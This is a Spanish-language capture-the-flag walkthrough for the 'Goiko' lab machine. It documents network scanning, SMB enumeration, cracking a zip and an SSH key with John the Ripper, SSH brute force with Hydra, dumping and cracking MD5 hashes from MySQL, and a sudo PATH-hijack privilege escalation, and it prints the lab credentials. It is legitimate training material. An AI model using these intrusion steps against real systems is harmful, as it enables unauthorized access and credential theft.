# Goiko

Maquina que vamos a utilizar Kali Linuxy Goiko https://thehackerslabs.com/goiko/

```bash
sudo arp-scan -I eth0 --localnet 
```

![image.png](./imagenes/image%20218.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=1000 -n -vvv -Pn 10.0.3.38
```

![image.png](./imagenes/image%20219.png)

- Probamos iniciar por en el FTP que corre en el puerto 10021 como **anonymous**.
    
    ```bash
    ftp 10.0.3.38 -p 10021
    ```
    
    ![image.png](./imagenes/image%20220.png)
    
    El anonymous no funciona pero nos encontramos con un posible nombre de usuario. “**gurpreet**”
    
- Vamos aprobar a listar recursos compartidos con el samba que corre por el puerto 445
    
    ```bash
    smbclient -L [//10.0.3.38](./imagenes/https://10.0.3.38/) -N
    ```
    
    ![image.png](./imagenes/image%20221.png)
    

- Probamos haber que recursos tengo aceso
    
    ```bash
    smbclient -L //10.0.3.38/ -U gurpreet
    ```
    
    ![image.png](./imagenes/image%20222.png)
    

- Investigamos cada uno de los recursos **/Dessert**
    
    ```bash
    smbclient -U 'gurpreet' [//10.0.3.38/Dessert](./imagenes/https://10.0.3.38/Dessert)
    ```
    
    `ls`
    
    ![image.png](./imagenes/image%20223.png)
    
- Nos traemos los ficheros a nuestra Kali para examinarlos
    
    `get comida.txt`
    
    `get cafe.txt` 
    
    `get creds.txt`
    
    ![image.png](./imagenes/image%20224.png)
    
    ![image.png](./imagenes/image%20225.png)
    
    ```bash
    cat creds.txt 
    ```
    
    ![image.png](./imagenes/image%20226.png)
    
    Tenemos una pista un nombre de usuario **6 letras** y la primera **empieza por m**
    

- En el recurso **/menu**
    
    ```bash
    smbclient -U 'gurpreet' [//10.0.3.38/Menu](./imagenes/https://10.0.3.38/Menu) 
    ```
    
    `ls`
    
    `get .cafesinleche` 
    
    `get goiko.txt`
    
    ![image.png](./imagenes/image%20227.png)
    
    ```bash
    ls -la
    ```
    
    ```bash
    cat .cafesinleche 
    ```
    
    ![image.png](./imagenes/image%20228.png)
    
    Nos encontramos un nuevo usuario pero está vez con una contraseña: 
    
    **user = marmai
    pass = EspabilaSantiaga69**
    
- Vamos a probar estas credenciales con el FTP
    
    ```bash
    ftp 10.0.3.38 -p 10021
    ```
    
    `ls -la`
    
    ![image.png](./imagenes/image%20229.png)
    

- Nos traemos el archivo BurgerWithoutCheese.zip a nuestra maquina Kali
    
    `get BurgerWithoutCheese.zip`
    
    ![image.png](./imagenes/image%20230.png)
    

- Es un archivo protegido así que vamos a usar **John The Ripper**
    
    ```bash
    zip2john BurgerWithoutCheese.zip > hash
    ```
    
    ![image.png](./imagenes/image%20231.png)
    
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash
    ```
    
    ![image.png](./imagenes/image%20232.png)
    
    Contraseña: **princess95** 
    
- Descomprimimos el archivo
    
    ```bash
    unzip BurgerWithoutCheese.zip 
    ```
    
    ![image.png](./imagenes/image%20233.png)
    
- Miramos el contenido de los dos archivos.
    
    ```bash
    cat users 
    ```
    
    ![image.png](./imagenes/image%20234.png)
    

```bash
cat id_rsa
```

![image.png](./imagenes/image%20235.png)

- Usamos de nuevo **John The Ripper** pero con la **id_rsa**
    
    ```bash
    ssh2john id_rsa > hashssh 
    ```
    
    ![image.png](./imagenes/image%20236.png)
    

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashssh
```

![image.png](./imagenes/image%20237.png)

**babygirl**

- Vamos a probar fuerza bruta con el SSH usando el **archivo users**
    
    ```bash
    hydra -L users  -p babygirl ssh://10.0.3.38
    ```
    
    ![image.png](./imagenes/image%20238.png)
    
    **login: gurpreet   password: babygirl**
    

- Nos metemos en SSH con las credenciales obtenidas.
    
    ```bash
    ssh [gurpreet@10.0.3.38](./imagenes/mailto:gurpreet@10.0.3.38)
    ```
    
    ![image.png](./imagenes/image%20239.png)
    

- Mirando nos encontramos un archivo llamado **nota**
    
    `cat nota`
    
    ![image.png](./imagenes/image%20240.png)
    
    Nos da una pista
    
- Voy a suponer que es una base de datos MySQL / MariaDB
    
    `mysql -u gurpreet -p`
    
    ![image.png](./imagenes/image%20241.png)
    
    `show databases;`
    
    ![image.png](./imagenes/image%20242.png)
    
    `use secta;`
    
    ![image.png](./imagenes/image%20243.png)
    
    `show database;`
    
    ![image.png](./imagenes/image%20244.png)
    
    `select * from integrantes;`
    
    ![image.png](./imagenes/image%20245.png)
    
    **carline: 703ff9a12582b2aaaa3fe7f89bb976c8
    nika: c6f606a6b6a30cbaa428131d4c074787**
    

- Nos copiamos los hash a archivos
    
    ```bash
    echo "703ff9a12582b2aaaa3fe7f89bb976c8" >carline.txt
    ```
    
    ```bash
    echo "c6f606a6b6a30cbaa428131d4c074787" >nika.txt
    ```
    
    ![image.png](./imagenes/image%20246.png)
    

- Voy a identificar que tipo de hash son con **hash-identifier**
    
    ![image.png](./imagenes/image%20247.png)
    
    ![image.png](./imagenes/image%20248.png)
    
    Los dos son MD5
    
- Usamos **John The Ripper**
    
    ```bash
    John --wordlist=/usr/share/wordlists/rockyou.txt carline.txt --format=RAW-MD5
    ```
    
    ![image.png](./imagenes/image%20249.png)
    
    **carline: lucymylove**
    

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt nika.txt --format=RAW-MD5
```

![image.png](./imagenes/image%20250.png)

Aquí no nos saca nada.

- Entramos de nuevo al SSH con la nuevas credenciales. Ojo las credenciales están mal puesta y la de carline es la de nika y viceversa a si que tenemos que tenerlo en cuenta al entrar en el SSH.
    
    ```bash
    ssh [nika@10.0.3.38](./imagenes/mailto:nika@10.0.3.38)
    ```
    
    ![image.png](./imagenes/image%20251.png)
    

- Enumeramos archivos vulnerables con **sudo -l**
    
    `sudo -l`
    
    ![image.png](./imagenes/image%20252.png)
    

- Es un archivo con extensión **.sh**. Miramos lo que contiene
    
    `cat /opt/porno/watchporn.sh`
    
    ![image.png](./imagenes/image%20253.png)
    
    Vemos que llama al comando **find.** Vamos a intentar aprovecharnos de ello creando un archivo find y que ejecute el nuestro en vez del original.
    
- Nos movemos al directorio **/opt/porno/**
    
    `cd /opt/porno/`
    
- Creamos un archivo find falso y le damos todos los permisos
    
    `echo "/bin/bash" > find`
    
    ![image.png](./imagenes/image%20254.png)
    
    Al ejecutarse como root la línea **/bin/bash** nos dará una sesión de interprete de comando Bash como root.
    
    `chmod 777 find`
    
- Miramos el Path en que se ejecuta el archivo
    
    `echo $PATH`
    
    ![image.png](./imagenes/image%20255.png)
    

- Ejecutamos el archivo
    
    `sudo PATH=/opt/porno:$PATH /opt/porno/watchporn.sh`
    
    `whoami`
    
    ![image.png](./imagenes/image%20256.png)
    
    <aside>
    
    `sudo` ejecuta el comando con permisos de administrador.
    
    `PATH=/opt/porno:$PATH` agrega `/opt/porno` al principio del `PATH`, permitiendo la ejecución de archivos en esa ubicación.
    
    `/opt/porno/watchporn.sh` es el script que se ejecuta.
    
    </aside>
  